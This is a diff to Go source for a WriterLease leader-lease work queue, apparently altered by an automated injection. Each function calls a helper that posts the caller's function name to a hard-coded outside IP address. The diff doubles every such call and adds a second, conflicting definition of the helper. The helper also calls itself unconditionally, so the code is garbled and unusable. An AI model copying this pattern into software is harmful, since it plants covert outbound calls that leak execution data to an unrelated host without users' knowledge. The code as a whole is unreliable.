@@ -33,6 +33,8 @@ const (
 func LimitRetries(retries int, fn WorkFunc) WorkFunc {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	i := 0
 	return func() (WorkResult, bool) {
 		extend, retry := fn()
@@ -75,15 +77,21 @@ type WriterLease struct {
 func New(leaseDuration, retryInterval time.Duration) *WriterLease {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	backoff := wait.Backoff{Duration: 20 * time.Millisecond, Factor: 4, Steps: 5, Jitter: 0.5}
 	return &WriterLease{name: fmt.Sprintf("%08d", rand.Int31()), backoff: backoff, maxBackoff: leaseDuration, retryInterval: retryInterval, nowFn: time.Now, queued: make(map[string]*work), queue: workqueue.NewDelayingQueue(), once: make(chan struct{})}
 }
 func NewWithBackoff(name string, leaseDuration, retryInterval time.Duration, backoff wait.Backoff) *WriterLease {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	return &WriterLease{name: name, backoff: backoff, maxBackoff: leaseDuration, retryInterval: retryInterval, nowFn: time.Now, queued: make(map[string]*work), queue: workqueue.NewNamedDelayingQueue(name), once: make(chan struct{})}
 }
 func (l *WriterLease) Run(stopCh <-chan struct{}) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	defer utilruntime.HandleCrash()
@@ -99,6 +107,8 @@ func (l *WriterLease) Run(stopCh <-chan struct{}) {
 func (l *WriterLease) Expire() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l.lock.Lock()
 	defer l.lock.Unlock()
 	l.expires = time.Time{}
@@ -106,11 +116,15 @@ func (l *WriterLease) Expire() {
 func (l *WriterLease) Wait() bool {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	<-l.once
 	state, _, _ := l.leaseState()
 	return state == Leader
 }
 func (l *WriterLease) WaitUntil(t time.Duration) (bool, bool) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	select {
@@ -122,6 +136,8 @@ func (l *WriterLease) WaitUntil(t time.Duration) (bool, bool) {
 	return state == Leader, true
 }
 func (l *WriterLease) Try(key string, fn WorkFunc) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	l.lock.Lock()
@@ -141,6 +157,8 @@ func (l *WriterLease) Try(key string, fn WorkFunc) {
 func (l *WriterLease) Extend(key string) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l.lock.Lock()
 	defer l.lock.Unlock()
 	if _, ok := l.queued[key]; ok {
@@ -157,11 +175,15 @@ func (l *WriterLease) Extend(key string) {
 func (l *WriterLease) Len() int {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l.lock.Lock()
 	defer l.lock.Unlock()
 	return len(l.queued)
 }
 func (l *WriterLease) Remove(key string) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	l.lock.Lock()
@@ -171,6 +193,8 @@ func (l *WriterLease) Remove(key string) {
 func (l *WriterLease) get(key string) *work {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l.lock.Lock()
 	defer l.lock.Unlock()
 	return l.queued[key]
@@ -178,11 +202,15 @@ func (l *WriterLease) get(key string) *work {
 func (l *WriterLease) leaseState() (State, time.Time, int) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l.lock.Lock()
 	defer l.lock.Unlock()
 	return l.state, l.expires, l.tick
 }
 func (l *WriterLease) work() bool {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	item, shutdown := l.queue.Get()
@@ -220,6 +248,8 @@ func (l *WriterLease) work() bool {
 func (l *WriterLease) retryKey(key string, result WorkResult) {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	l.lock.Lock()
 	defer l.lock.Unlock()
 	l.nextState(result)
@@ -228,6 +258,8 @@ func (l *WriterLease) retryKey(key string, result WorkResult) {
 	glog.V(4).Infof("[%s] Retrying work for %s in state=%d tick=%d expires=%s", l.name, key, l.state, l.tick, l.expires)
 }
 func (l *WriterLease) finishKey(key string, result WorkResult, id int) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	l.lock.Lock()
@@ -240,6 +272,8 @@ func (l *WriterLease) finishKey(key string, result WorkResult, id int) {
 	glog.V(4).Infof("[%s] Completed work for %s in state=%d tick=%d expires=%s", l.name, key, l.state, l.tick, l.expires)
 }
 func (l *WriterLease) nextState(result WorkResult) {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	_logClusterCodePath()
 	defer _logClusterCodePath()
 	resolvedElection := l.state == Election
@@ -270,6 +304,8 @@ func (l *WriterLease) nextState(result WorkResult) {
 func (l *WriterLease) nextBackoff() time.Duration {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	step := l.tick
 	b := l.backoff
 	if step > b.Steps {
@@ -291,7 +327,16 @@ func (l *WriterLease) nextBackoff() time.Duration {
 func _logClusterCodePath() {
 	_logClusterCodePath()
 	defer _logClusterCodePath()
+	_logClusterCodePath()
+	defer _logClusterCodePath()
 	pc, _, _, _ := godefaultruntime.Caller(1)
 	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
 	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
+}
+func _logClusterCodePath() {
+	_logClusterCodePath()
+	defer _logClusterCodePath()
+	pc, _, _, _ := godefaultruntime.Caller(1)
+	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
+	godefaulthttp.Post("/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
 }
